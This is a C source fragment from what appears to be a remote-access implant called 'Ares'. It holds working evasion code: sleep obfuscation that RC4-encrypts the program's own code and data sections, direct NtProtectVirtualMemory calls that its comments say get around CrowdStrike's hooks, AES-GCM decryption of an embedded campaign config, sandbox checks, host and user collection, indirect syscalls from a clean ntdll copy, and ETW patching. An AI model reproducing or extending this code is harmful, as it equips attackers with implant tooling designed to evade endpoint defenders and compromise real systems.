    /* Collect ALL sections (.text, .rdata, .data) for encryption */
    struct { BYTE* addr; DWORD size; DWORD orig_prot; } targets[4];
    int ntargets = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections && ntargets < 4; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0 ||
            memcmp(sec[i].Name, ".rdata", 6) == 0 ||
            memcmp(sec[i].Name, ".data", 5) == 0) {
            targets[ntargets].addr = pe_base + sec[i].VirtualAddress;
            targets[ntargets].size = sec[i].Misc.VirtualSize;
            targets[ntargets].orig_prot = 0;
            ntargets++;
        }
    }

    if (ntargets == 0) { Sleep(actual); return; }

    /* Generate 256-byte RC4 key from hardware performance counter.
     * QueryPerformanceCounter provides ~100ns resolution â€” far better
     * entropy than GetTickCount (15ms resolution, trivially predictable). */
    BYTE rc4_key[256];
    {
        LARGE_INTEGER qpc;
        QueryPerformanceCounter(&qpc);
        DWORD seed = (DWORD)(qpc.QuadPart ^ (qpc.QuadPart >> 32));
        seed ^= GetCurrentThreadId();
        seed ^= (DWORD)(ULONG_PTR)&rc4_key; /* ASLR entropy */
        for (int i = 0; i < 256; i++) {
            seed = seed * 1103515245 + 12345;
            rc4_key[i] = (BYTE)((seed >> 16) & 0xFF);
        }
        if (rc4_key[0] == 0) rc4_key[0] = 0x5F;
    }

    /* â”€â”€ Timer-based decrypt context â”€â”€
     * Stored on heap â€” accessible from timer callback after .text encryption.
     * Timer callback will: decrypt sections â†’ restore protection â†’ signal event. */
    typedef struct _SLEEP_CTX {
        struct { BYTE* addr; DWORD size; DWORD orig_prot; } targets[4];
        int ntargets;
        BYTE rc4_key[256];
        HANDLE hEvent;       /* signaled when decrypt complete */
    } SLEEP_CTX;

    SLEEP_CTX* ctx = (SLEEP_CTX*)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY, sizeof(SLEEP_CTX));
    if (!ctx) { Sleep(actual); return; }

    ctx->ntargets = ntargets;
    memcpy(ctx->rc4_key, rc4_key, 256);
    for (int t = 0; t < ntargets; t++) {
        ctx->targets[t].addr = targets[t].addr;
        ctx->targets[t].size = targets[t].size;
        ctx->targets[t].orig_prot = targets[t].orig_prot;
    }

    ctx->hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ctx->hEvent) {
        HeapFree(GetProcessHeap(), 0, ctx);
        Sleep(actual);
        return;
    }

    /* â”€â”€ ENCRYPT: Set all sections to RW, then RC4 encrypt â”€â”€
     * v3.8 UPG-05: Use NtProtectVirtualMemory instead of VirtualProtect.
     * CrowdStrike hooks VirtualProtect and tracks RXâ†’RWâ†’sleepâ†’RWâ†’RX patterns
     * on the calling process's own PE sections (Ekko/Foliage signature).
     * NtProtectVirtualMemory bypasses the userland hook. */
    typedef NTSTATUS (NTAPI *fn_NtPVM)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    fn_NtPVM pNtPVM = (fn_NtPVM)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtProtectVirtualMemory");

    for (int t = 0; t < ntargets; t++) {
        PVOID base = targets[t].addr;
        SIZE_T sz = targets[t].size;
        ULONG old = 0;
        NTSTATUS st = 0;
        if (pNtPVM) {
            st = pNtPVM(GetCurrentProcess(), &base, &sz, PAGE_READWRITE, &old);
        } else {
            /* Fallback if ntdll resolution fails */
            if (!VirtualProtect(targets[t].addr, targets[t].size,
                    PAGE_READWRITE, (DWORD*)&old)) st = -1;
        }
        if (st != 0) {
            targets[t].size = 0;
            continue;
        }
        targets[t].orig_prot = (DWORD)old;
        RC4_CTX rctx;
        _rc4_init(&rctx, rc4_key, sizeof(rc4_key));
        _rc4_crypt(&rctx, targets[t].addr, targets[t].size);
        /* Update context with actual orig_prot */
        ctx->targets[t].orig_prot = targets[t].orig_prot;
        ctx->targets[t].size = targets[t].size;
    }

    /* â”€â”€ Schedule timer callback to decrypt after sleep â”€â”€
     * Timer callback runs from ntdll thread pool (TppWorkerThread).
     * It decrypts all sections and signals the event.
     * We use a WAITORTIMERCALLBACK with the _rc4 functions.
     *
     * IMPORTANT: _rc4_init and _rc4_crypt are in .text which is now encrypted.
     * We need to use SystemFunction032 (ntdll RC4) instead â€” it's always available
     * and lives in ntdll (not our encrypted .text). */
    typedef struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } USTRING;
    typedef NTSTATUS (WINAPI *fn_SystemFunction032)(USTRING*, USTRING*);
    typedef NTSTATUS (NTAPI *fn_NtDE)(BOOLEAN, PLARGE_INTEGER);

    /* Resolve SystemFunction032 and NtDelayExecution from ntdll BEFORE encrypting .text */
    HMODULE hAdvapi = LoadLibraryW(L"advapi32.dll");
    fn_SystemFunction032 pSF032 = NULL;
    if (hAdvapi)
        pSF032 = (fn_SystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");

    fn_NtDE pDelay = (fn_NtDE)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");

    /* === SLEEP === (ALL sections encrypted â€” code + data + strings hidden) */
    if (pDelay) {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)actual * 10000LL;
        pDelay(FALSE, &delay);
    } else {
        Sleep(actual);
    }

    /* â”€â”€ DECRYPT: RC4 decrypt using same key, restore protection â”€â”€ */
    /* After sleep, we're back â€” decrypt using the key still on our stack
     * (stack is NOT encrypted). _rc4_init/_rc4_crypt are in encrypted .text,
     * so we use SystemFunction032 (ntdll/advapi32 RC4) for decryption.
     * v3.8: pNtPVM was resolved before encryption â€” pointer lives on stack. */
    if (pSF032) {
        for (int t = 0; t < ntargets; t++) {
            if (ctx->targets[t].size == 0) continue;
            USTRING data_str = { ctx->targets[t].size, ctx->targets[t].size, ctx->targets[t].addr };
            USTRING key_str  = { 256, 256, rc4_key };
            pSF032(&data_str, &key_str);
            /* v3.8: Restore protection via NtProtectVirtualMemory (no VirtualProtect hook) */
            if (pNtPVM) {
                PVOID rb = ctx->targets[t].addr;
                SIZE_T rs = ctx->targets[t].size;
                ULONG ro = 0;
                pNtPVM(GetCurrentProcess(), &rb, &rs, ctx->targets[t].orig_prot, &ro);
            } else {
                DWORD _unused;
                VirtualProtect(ctx->targets[t].addr, ctx->targets[t].size,
                    ctx->targets[t].orig_prot, &_unused);
            }
        }
    } else {
        /* Fallback: decrypt only non-.text sections with our own RC4
         * (.text can't be decrypted with in-.text code if it's encrypted) */
        for (int t = 0; t < ntargets; t++) {
            if (ctx->targets[t].size == 0) continue;
            RC4_CTX rctx;
            _rc4_init(&rctx, rc4_key, sizeof(rc4_key));
            _rc4_crypt(&rctx, ctx->targets[t].addr, ctx->targets[t].size);
            if (pNtPVM) {
                PVOID rb = ctx->targets[t].addr;
                SIZE_T rs = ctx->targets[t].size;
                ULONG ro = 0;
                pNtPVM(GetCurrentProcess(), &rb, &rs, ctx->targets[t].orig_prot, &ro);
            } else {
                DWORD _unused;
                VirtualProtect(ctx->targets[t].addr, ctx->targets[t].size,
                    ctx->targets[t].orig_prot, &_unused);
            }
        }
    }

    /* Cleanup */
    CloseHandle(ctx->hEvent);
    SecureZeroMemory(ctx, sizeof(SLEEP_CTX));
    HeapFree(GetProcessHeap(), 0, ctx);
    SecureZeroMemory(rc4_key, sizeof(rc4_key));
}

/* â”€â”€ AES-256-GCM Decrypt (v3.9 â€” replaces XOR config decode) â”€â”€
 *
 * Uses Windows BCrypt API (linked via -lbcrypt).
 * Input layout: ciphertext || tag(16 bytes)
 * Key: 32 bytes (AES-256), Nonce: 12 bytes
 * Returns TRUE on success, decrypted data written to `out`.
 */

/* bcrypt.h â€” removed: types provided by ares_resolve.h manual defs (no IAT) */

BOOL Ares_AES_GCM_Decrypt(const BYTE* enc, DWORD enc_len, const BYTE* key,
                           const BYTE* nonce, BYTE* out)
{
    if (enc_len < 16) return FALSE; /* minimum: 16-byte tag */
    if (!_resolve_bcrypt()) return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    /* Separate ciphertext and GCM tag (last 16 bytes) */
    DWORD ct_len = enc_len - 16;
    const BYTE* tag = enc + ct_len;

    /* Open AES algorithm provider */
    status = p_BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) goto cleanup;

    /* Set chaining mode to GCM */
    status = p_BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status != 0) goto cleanup;

    /* Generate symmetric key from raw key bytes */
    status = p_BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
        (PUCHAR)key, 32, 0);
    if (status != 0) goto cleanup;

    /* Set up authenticated cipher mode info (GCM) */
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag   = (PUCHAR)tag;
    authInfo.cbTag   = 16;
    authInfo.pbAuthData = NULL;
    authInfo.cbAuthData = 0;

    /* Decrypt */
    DWORD bytes_done = 0;
    status = p_BCryptDecrypt(hKey, (PUCHAR)enc, ct_len, &authInfo,
        NULL, 0, out, ct_len, &bytes_done, 0);
    if (status == 0) {
        out[bytes_done] = '\0'; /* null-terminate for string use */
        result = TRUE;
    }

cleanup:
    if (hKey) p_BCryptDestroyKey(hKey);
    if (hAlg) p_BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

/* â”€â”€ Main Init (v2.1 â€” reduced detection surface) â”€â”€ */

#ifdef ARES_DEBUG
#define _RDBG_CORE(msg) do { FILE* _f = fopen("C:\\Temp\\ares2.log", "a"); if(_f){fprintf(_f,"[CORE] %s\n",msg);fclose(_f);} } while(0)
#else
#define _RDBG_CORE(msg) ((void)0)
#endif

BOOL Ares_Init(AGENT_STATE* state)
{
    memset(state, 0, sizeof(AGENT_STATE));
    state->running = TRUE;
    state->pid = GetCurrentProcessId();
    _RDBG_CORE("Ares_Init: start");

    /* Get basic info */
    DWORD sz = sizeof(state->hostname);
    GetComputerNameA(state->hostname, &sz);
    sz = sizeof(state->username);
    GetUserNameA(state->username, &sz);

    /* Check for sandbox FIRST â€” but respect CFG_SANDBOX_CHECK config */
#if defined(ARES_CONFIG_H) && CFG_SANDBOX_CHECK == 0
    /* Sandbox check disabled by campaign config */
#else
    if (Ares_CheckSandbox()) return FALSE;
#endif

    /* Step 1: Read clean ntdll from disk for SSN resolution.
     * v2.1: We no longer overwrite loaded ntdll .text section.
     * Unhooking triggers ETW-TI kernel callbacks and is unnecessary
     * because all critical operations use indirect syscalls that
     * bypass userland hooks entirely via jmp [syscall_gadget]. */
    _RDBG_CORE("Ares_Init: reading clean ntdll");
    state->clean_ntdll = read_clean_ntdll(&state->ntdll_size);
    if (!state->clean_ntdll) { _RDBG_CORE("Ares_Init: read_clean_ntdll FAIL"); return FALSE; }
    _RDBG_CORE("Ares_Init: ntdll OK");

    /* Step 2: Resolve all SSNs from clean ntdll copy */
    if (!Ares_ResolveSyscalls(state)) { _RDBG_CORE("Ares_Init: ResolveSyscalls FAIL"); return FALSE; }
    _RDBG_CORE("Ares_Init: syscalls resolved");

    /* Step 3: ETW bypass (v3.8: prologue patch via indirect syscall)
     * v2.1: AMSI patch removed â€” native C is never AMSI-scanned.
     * v3.8: Uses Ares_PatchETW_Ex with state â€” patches EtwEventWrite
     *        prologue via NtWriteVirtualMemory syscall (no DR0 exposure). */
    Ares_PatchETW_Ex(state);

    /* Step 4: Build syscall stubs for critical functions */
    /* From this point, all memory operations use indirect syscalls */

    return TRUE;
}
